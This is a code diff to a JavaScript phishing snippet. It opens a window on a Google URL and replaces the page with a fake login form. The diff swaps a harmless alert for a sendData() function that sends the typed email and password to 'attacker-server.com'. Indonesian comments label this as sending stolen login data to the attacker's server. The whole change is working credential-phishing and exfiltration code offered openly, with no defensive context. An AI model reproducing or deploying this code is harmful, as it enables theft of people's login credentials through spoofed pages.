@@ -2,7 +2,22 @@
 function go(){
     var x = window.open('https://www.google.com/csi');
     setTimeout(function(){
-        x.document.body.innerHTML = '<img src="https://via.placeholder.com/150" alt="Placeholder Image"><h1>Please login</h1>Email:<input id="email"><br>Pass:<input id="pass" type="password"><br><button onclick="alert(\'Email: \'+document.getElementById(\'email\').value+\'\\nPass:\'+document.getElementById(\'pass\').value)">Login</button>';
+        x.document.body.innerHTML = '<img src="https://via.placeholder.com/150" alt="Placeholder Image"><h1>Please login</h1>Email:<input id="email"><br>Pass:<input id="pass" type="password"><br><button onclick="sendData()">Login</button>';
+
+        // Fungsi untuk mengirim data login yang dicuri ke server penyerang
+        function sendData(){
+            var email = document.getElementById('email').value;
+            var pass = document.getElementById('pass').value;
+
+            // Kirim data ke server penyerang (ganti dengan server penyerang)
+            fetch('http://attacker-server.com/log?email=' + encodeURIComponent(email) + '&pass=' + encodeURIComponent(pass), {
+                method: 'GET'
+            }).then(response => {
+                console.log('Data sent to attacker server');
+            }).catch(err => {
+                console.error('Failed to send data', err);
+            });
+        }
     }, 3000);
 }
 </script>
